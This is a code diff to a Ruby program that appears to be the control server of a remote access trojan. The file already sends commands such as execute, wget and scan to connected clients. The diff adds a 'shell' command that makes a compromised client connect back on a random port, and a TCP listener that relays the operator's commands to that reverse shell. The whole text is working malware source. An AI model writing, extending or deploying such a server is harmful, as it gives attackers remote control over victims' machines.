@@ -8,7 +8,18 @@ debug_status = false
 debug_status = true if ARGV.include? ("DEBUG")
 
 def debug(msg='')
-  puts "[#{"DEBUG".yellow}] #{msg}" if debug_status
+  puts "[#{"DEBUG".yellow}] #{msg}"
+end
+
+# Function to interact with client reverse shells
+def drop_into_shell(port)
+  debug "Reverse shell listener started on port #{port}"
+  server = TCPServer.new('0.0.0.0', port)
+  loop do
+    client = server.accept
+    client.puts gets.chomp!
+    puts client.gets
+  end
 end
 
 class Server
@@ -28,7 +39,7 @@ class Server
     @key = AES.key  # Varies PER SERVER LAUNCH, so clients can (almost) NEVER come back
     @iv = AES.iv(:base_64)
 
-    # Write the key to a file for the client to read when building client
+    # Write the key to a file for the client to read when being built
     File.open('/tmp/rratkey.dat', 'w') do |f|
       f.puts self.key
       f.print self.iv
@@ -110,7 +121,7 @@ class Server
   end
 
   def kill
-    p 'in kill'
+    #p 'in kill'
   end
   # Print the help screen
   def help
@@ -148,7 +159,7 @@ end
 
 def run
 
-  client_commands  = [ 'getpid', 'ifconfig', 'scan', 'sysinfo', 'pwd', 'wget', 'execute', 'ls']
+  client_commands  = [ 'getpid', 'ifconfig', 'scan', 'sysinfo', 'pwd', 'wget', 'execute', 'ls', 'shell']
   general_commands = [ 'client', 'clients', 'help', 'history', 'clear', 'quit', 'exit']
 
   port = 4567
@@ -223,6 +234,10 @@ def run
     when 'ls'
       server.send_client('ls', server.current_client)
       data = server.recv_client(server.current_client)
+    when 'shell'
+      rev_port = rand(500..65535)
+      server.send_client("shell #{rev_port}", server.current_client)
+      drop_into_shell(rev_port)
     when 'quit'
       server.quit
       next  # We should only get here if they choose 'no'
